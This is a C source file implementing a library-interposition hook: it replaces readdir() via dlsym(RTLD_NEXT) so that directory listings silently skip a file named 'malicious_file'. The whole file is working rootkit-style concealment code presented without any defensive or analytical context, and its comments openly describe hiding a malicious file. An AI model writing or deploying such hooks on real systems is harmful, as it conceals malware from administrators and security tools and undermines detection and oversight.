/*#define _GNU_SOURCE*/
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
// Function pointer typedef for the original readdir ls function
typedef struct dirent* (*ls_t)(DIR*);
// Interposed ls function
struct dirent* readdir(DIR* dirp) {
  // Get the original readdir address
  ls_t original_readdir = (ls_t)dlsym(RTLD_NEXT, "readdir");
  struct dirent* entry;
  do {
    // Call the original ls function to get the next directory entry
    entry = original_readdir(dirp);
    // Check if the entry is the file we want to hide
    if (entry != NULL && strcmp(entry->d_name, "malicious_file") == 0) {
      // Skip the file by calling the original ls function again
      entry = original_readdir(dirp);
    }
  } while (entry != NULL && strcmp(entry->d_name, "malicious_file") == 0);
  return entry;
}
